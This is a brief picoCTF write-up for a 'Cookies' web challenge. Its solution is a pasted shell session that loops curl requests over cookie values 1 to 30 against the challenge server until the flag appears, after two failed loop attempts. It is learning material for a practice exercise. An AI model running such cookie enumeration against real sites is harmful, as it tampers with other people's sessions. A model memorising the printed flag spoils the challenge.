#### Descripción 
Who doesn't love cookies? Try to figure out the best one.

Additional details will be available after launching your challenge instance.

http://wily-courier.picoctf.net:59871/check
#### Solución
```
        });
    });
    </script>
</body>

</html>SebAcuna-picoctf@webshell:~$ for {1 .. 30}; do curl -s http://wily-courier.pico:59871/check -H "Cookie: name=$i"; done | grep pico
-bash: syntax error near unexpected token `..'
SebAcuna-picoctf@webshell:~$ for {1..30}; do curl -s http://wily-courier.picoctf.net:59871/check -H "Cookie: name=$i"; done | grep pico
-bash: `{1..30}': not a valid identifier
SebAcuna-picoctf@webshell:~$ for i in {1..30}; do curl -s http://wily-courier.picoctf.
net:59871/check -H "Cookie: name=$i"; done | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
SebAcuna-picoctf@webshell:~$ ^C
```

#### Notas
#### Referencias
